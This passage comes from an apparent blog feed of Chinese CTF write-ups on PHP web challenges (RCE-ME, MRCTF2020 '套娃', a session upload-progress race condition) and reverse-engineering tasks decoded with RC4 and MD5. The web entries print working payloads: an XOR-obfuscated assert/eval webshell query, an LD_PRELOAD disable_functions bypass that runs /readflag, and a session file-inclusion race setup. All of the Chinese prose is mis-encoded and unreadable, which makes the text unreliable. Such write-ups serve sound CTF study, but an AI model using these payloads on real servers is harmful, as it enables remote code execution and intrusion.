single-quoted-string">');'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿æ¥èšå‰‘ï¼Œå¾— æ— æƒé™çœ‹flag</p><h2 id="disable-function-bypass"><a href="#disable-function-bypass" class="headerlink" title="disable_function bypass"></a>disable_function bypass</h2><blockquote><p>åˆ©ç”¨linuxæä¾›çš„LD_preloadç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒå…±äº«soï¼Œåœ¨å¯åŠ¨å­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ–°çš„å­è¿›ç¨‹ä¼šåŠ è½½æˆ‘ä»¬æ¶æ„çš„soæ‹“å±•ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨soé‡Œé¢å®šä¹‰åŒåå‡½æ•°ï¼Œå³å¯åŠ«æŒAPIè°ƒç”¨ï¼ŒæˆåŠŸRCE</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200020339.png" alt="image-20210720200020339"></p></blockquote><p>æ‰¾ä¸ªæœ‰ä¸Šä¼ æƒé™çš„ç›®å½•ä¸Šä¼ æ–‡ä»¶</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200058520.png" alt="image-20210720200058520"></p><p>ç½‘ä¸ŠæŠ„æ¥çš„paylaod</p><pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])ç­‰ä»·äºï¼š?code&#x3D;$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[&#39;a&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºåªæœ‰/var/tmpæœ‰ä¸Šä¼ æƒé™ï¼Œæ‰€ä»¥ç”¨<code>assert(include(&#39;/var/tmp/bypass_disablefunc.php&#39;))</code>çš„å½¢å¼ï¼Œç­‰åŒäºç›´æ¥è®¿é—®<code>bypass_disablefunc.php</code></p><pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200141088.png" alt="image-20210720200141088"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>é‡åšä¸€éï¼Œwpé‡å†™ï¼Œå½“æ—¶è‚¯å®šå·æ‡’äº†ï¼Œä»¥ä¸ºæ‡‚äº†ï¼Œå…¶å®è¿˜æ²¡æ‡‚ï¼Œå¼„çš„ä¹‹åå†åšç±»ä¼¼çš„é¢˜è¿˜æ˜¯æ²¡åšå‡ºæ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[MRCTF2020]å¥—å¨ƒ</title>
      <link href="/p/17361915.html"/>
      <url>/p/17361915.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193635584.png" alt="image-20210720193635584"></p><pre class="line-numbers language-none"><code class="language-none">?b+u+p+t&#x3D;23333%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193722983.png" alt="image-20210720193722983"></p><p>file_get_contentsé…åˆä¼ªåè®®data://ä½¿ç”¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">re <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193743881.png" alt="image-20210720193743881"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193748798.png" alt="image-20210720193748798"></p><h2 id="å¥‡æ–‡å…±èµ"><a href="#å¥‡æ–‡å…±èµ" class="headerlink" title="å¥‡æ–‡å…±èµ"></a>å¥‡æ–‡å…±èµ</h2><p><a href="https://www.freebuf.com/articles/web/213359.html">åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨phpinfoä¸æ–‡ä»¶åŒ…å«è¿›è¡Œæ¡ä»¶ç«äº‰</title>
      <link href="/p/4200301947.html"/>
      <url>/p/4200301947.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>2021å¹´9æœˆ4æ—¥21:06:29</p><p>åˆåšäº†å¾ˆå¤šç±»å‹çš„é¢˜ï¼Œå…·ä½“å¯è§<a href="https://syunaht.com/p/2193317358.html">åˆ·é¢˜ç¬”è®°:[NPUCTF2020]ezinclude</a></p><hr><p>2021å›½èµ›åšåˆ°ä¸€é“ï¼Œè®°å½•ä¸‹</p><p>ç±»ä¼¼é¢˜ï¼š<a href="https://www.cnblogs.com/NPFS/p/13795170.html">åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSè¿›è¡Œæ–‡ä»¶åŒ…å«</a></p><h2 id="å¤§è‡´æ€è·¯"><a href="#å¤§è‡´æ€è·¯" class="headerlink" title="å¤§è‡´æ€è·¯"></a>å¤§è‡´æ€è·¯</h2><h3 id="å‰ç»"><a href="#å‰ç»" class="headerlink" title="å‰ç»"></a>å‰ç»</h3><p>éœ€è¦å…ˆæ‰¾åˆ°phpinfo.php =ã€‹æ‰«ç›®å½•å§<br>ç„¶åæœ‰ä¸¤æ¡è·¯ï¼š</p><p>1.ç»™phpinfo.phpå‘åŒ… <a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">ç¤ºä¾‹</a><br>2.åˆ©ç”¨sessionã€‚<br>å›½èµ›è¿™é‡Œæ˜¯ç¬¬äºŒæ¡</p><h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><p>åˆ©ç”¨<code>session.upload_progress</code>å°†æœ¨é©¬å†™å…¥<code>session</code>æ–‡ä»¶</p><p>1.session.use_strict_mode=off(é»˜è®¤)</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195058143.png" alt="image-20210720195058143"></p><p>æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=flagï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š/tmp/sess_flagã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Session,å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ã€‚</p><blockquote><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œsessionæ–‡ä»¶ä¸€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®ä¸º/tmpæˆ–/var/lib/php/session</p></blockquote><p>2.session.upload_progress.cleanup é»˜è®¤å¼€å¯<br>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œsession.upload_progress.cleanupæ˜¯å¼€å¯çš„ï¼Œä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œå®ƒå°±ä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚<br>æ‰€ä»¥æ²¡é‚£ä¹ˆç®€å•ï¼Œéœ€è¦æ¡ä»¶ç«äº‰ã€‚</p><h2 id="å…·ä½“æµç¨‹"><a href="#å…·ä½“æµç¨‹" class="headerlink" title="å…·ä½“æµç¨‹"></a>å…·ä½“æµç¨‹</h2><p>POSTå‘åŒ…ä»£ç ï¼Œæ–¹ä¾¿æŠ“åŒ…</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"http://e113b1bc-28b8-4f08-9e60-b74fe3a96ef3.chall.ctf.show/"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"POST"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"hidden"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"123"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ·»åŠ ä¸€ä¸ª<code>Cookie :PHPSESSID=flag</code>ï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/sessionè·¯å¾„/sess_flag</code></p><p>ç„¶åä¸¤ä¸ª<code>intruder</code>å¼€èµ·æ¥ï¼ŒæŠŠå‡½æ•°æ‰§è¡Œçš„éå†ç›®å½•ç»“æœå­˜æ”¾åˆ°<code>session</code>é‡Œï¼Œç„¶ååŒ…å«å‡ºæ¥ã€‚<br>åŸæœ¬<code>session</code>äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶æ˜¯ç§’è¢«åˆ çš„ï¼Œä½†å› ä¸ºæ¡ä»¶ç«äº‰é€ æˆå†²çª/æº¢å‡ºä»¥è‡³äº0.å‡ ç§’çš„æ®‹ä½™å°±æ­£å¥½è¢«åŒ…å«å‡ºæ¥äº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195236050.png" alt="image-20210720195236050"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195241924.png" alt="image-20210720195241924"></p><p>ç›´æ¥åŒ…å«å‡ºâ€œæ–‡ä»¶â€å†…å®¹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195244811.png" alt="image-20210720195244811"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> æ¡ä»¶ç«äº‰ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:BabyConst</title>
      <link href="/p/136608434.html"/>
      <url>/p/136608434.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯:[MD5|åŠ å¯†ç®—æ³•é¢˜|å¯†ç å­¦|å¸¸è§åŠ å¯†]</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223358350.png" alt="image-20210719223358350"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223402127.png" alt="image-20210719223402127"></p><p>è™½ç„¶ä¹Ÿæœå‡ºäº†å…¶ä»–åŠ å¯†ç®—æ³•â€¦â€¦<br>å§‘ä¸”è®¤ä¸ºè¿™ä¸ªæ˜¯MD5ç®—æ³•</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223557686.png" alt="image-20210719223557686"></p><p>12ä¸ªå¾ªç¯ï¼Œä¸€è¡Œå–16ä¸ªå­—èŠ‚ï¼Œæ­£å¥½æ˜¯ä¸€ä¸ªé•¿åº¦32çš„å­—ç¬¦ä¸²ï¼ŒMD5è§£å¯†ä¸€ä¸‹ï¼Œç»“æŸ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223706958.png" alt="image-20210719223706958"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> å¸¸è§åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:BabyAlgorithm</title>
      <link href="/p/1965950118.html"/>
      <url>/p/1965950118.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯:[RC4|åŠ å¯†ç®—æ³•é¢˜|å¯†ç å­¦|å¸¸è§åŠ å¯†]</p><p>åŠ å¯†ç®—æ³•é‡Œæœ‰å¥½å‡ ä¸ªmod 256 ç„¶åäº¤æ¢å•¥çš„ï¼Œå¯ä»¥åˆ¤æ–­ä¸ºRC4ç®—æ³•ï¼Œå…·ä½“çœ‹ç¬”è®°ç‰¹å¾å€¼è¯†åˆ«</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyAlgorithm/image-20210719223140957.png" alt="image-20210719223140957"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyAlgorithm/image-20210719223146411.png" alt="image-20210719223146411"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyAlgorithm/image-20210719223150621.png" alt="image-20210719223150621"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">46</span>v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC6</span>v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x21</span>v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCA</span>v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span>v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x51</span>v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x43</span>v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x37</span>v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31</span>v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x75</span>v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE4</span>v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x8E</span>v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC0</span>v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x54</span>v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6F</span>v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x8F</span>v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xEE</span>v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF8</span>v8<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x5A</span>v8<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA2</span>v8<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC1</span>v8<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xEB</span>v8<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA5</span>v8<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x34</span>v8<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6D</span>v8<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x71</span>v8<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x55</span>v8<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span>v8<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7</span>v8<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xB2</span>v8<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA8</span>v8<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2F</span>v8<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF4</span>v8<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x51</span>v8<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x8E</span>v8<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC</span>v8<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCC</span>v8<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x33</span>v8<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x53</span>v8<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31</span>v8<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span>v8<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD6</span>v8<span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCA</span>v8<span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xEC</span>v8<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD4</span>inputStr_length <span class="token operator">=</span> <span class="token number">45</span>ctf233 <span class="token operator">=</span> <span class="token string">"Nu1Lctf233"</span>v3 <span class="token operator">=</span> <span class="token number">0</span>tempStr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># å…ˆç”Ÿæˆä¸€ä¸ªtempStr</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tempStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>tempStr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>v3<span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ctf233<span class="token punctuation">[</span>j <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    <span class="token comment"># ç„¶åäº¤æ¢ä¸¤ä¸ªæ•°</span>    temp <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> tempv5 <span class="token operator">=</span> <span class="token number">0</span>v6 <span class="token operator">=</span> <span class="token number">0</span>v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span>v7 <span class="token operator">&lt;</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v6<span class="token operator">+</span>tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    <span class="token comment"># äº¤æ¢</span>    temp <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>v6<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> temp    <span class="token comment">#v8[v7] = tempStr[tempStr[v5]+tempStr[v6]] ^ flag[v7] å‰é¢éƒ½ç…§ç€ç®—æ³•èµ°ï¼Œæœ€åäº¤æ¢å¾‹ä¸€ä¸‹å®Œäº‹</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v8<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">^</span> tempStr<span class="token punctuation">[</span><span class="token punctuation">(</span>tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token operator">+</span>tempStr<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v7 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> å¸¸è§åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[DDCTF 2019]Windows_Reverse1</title>
      <link href="/p/1790846966.html"/>
      <url>/p/1790846966.html</url>
      
